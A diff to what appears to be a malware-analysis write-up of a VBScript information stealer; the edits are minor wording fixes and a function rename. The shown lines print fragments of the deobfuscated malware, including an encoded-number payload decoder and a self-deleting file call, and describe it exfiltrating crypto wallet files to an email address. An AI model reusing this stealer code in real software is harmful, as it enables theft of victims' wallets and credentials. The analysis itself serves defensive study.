@@ -74,7 +74,7 @@ sorry server is no longer available
 
 ## Deobfuscation
 
-**However, in `image.png.vbs`, it's a VBS script:**
+**However, in `image.png.vbs`, it's a VBScript:**
 ```vb
 dIM jJkmPKZNvhSgPGmVLdvBVgOimreRTqiaEDiOcfNqy, AxEjAhgOVVhnXPrQQdPpAItXlqhuIRHOuDWWhvoyp, FwwcltIiESLKzggUCrjiaEUtjbmpvvGzwJNhoLFSp
 Sub FncTqZirWltYCeayCzqdIRdKqrIzaKWRIZbSCprXS
@@ -164,10 +164,10 @@ enD sUB
 
 **Which executes the payload. (DO NOT RUN THIS EVAL)**
 
-**So, after all the renames, the deobfucasted VBS script is this:**
+**So, after all the renames, the deobfucasted VBScript is this:**
 ```vb
 dIM stringsOfNumbers, splitedStringsOfNumbers, evaledStringsOfNumbers
-Sub FncTqZirWltYCeayCzqdIRdKqrIzaKWRIZbSCprXS
+Sub functionSplitStringsOfNumbers
 stringsOfNumbers = "399711/3601*702350/6385*8573-8541*847693/8393*7119-7005*7714-7600*463-352*1137720/9980*214336/6698*-5139+5253*8037-7936*297045/2583*[...]*2065-2024"
 splitedStringsOfNumbers = splIt(stringsOfNumbers, "*")
 for each number In splitedStringsOfNumbers
@@ -313,7 +313,7 @@ Set mFSO = CreateObject("Scripting.FileSystemObject")
 Call mFSO.DeleteFile(WScript.ScriptFullName, True)
 ```
 
-As you can see, this malware is an information stealer malware, as **it's exfiltrating `odinreport.zip`, crypto wallet like Bitcoin's `wallet.dat`, Electrum's `default_wallet`.**
+As you can see, this malware is an information stealer malware, as **it's exfiltrating `odinreport.zip`, crypto wallets like Bitcoin's `wallet.dat`, Electrum's `default_wallet`.**
 
 **Also, in this stage 2 payload, it's adding those attachments to an email, and send to email address `bmwqia84@mail.ru`.**
 
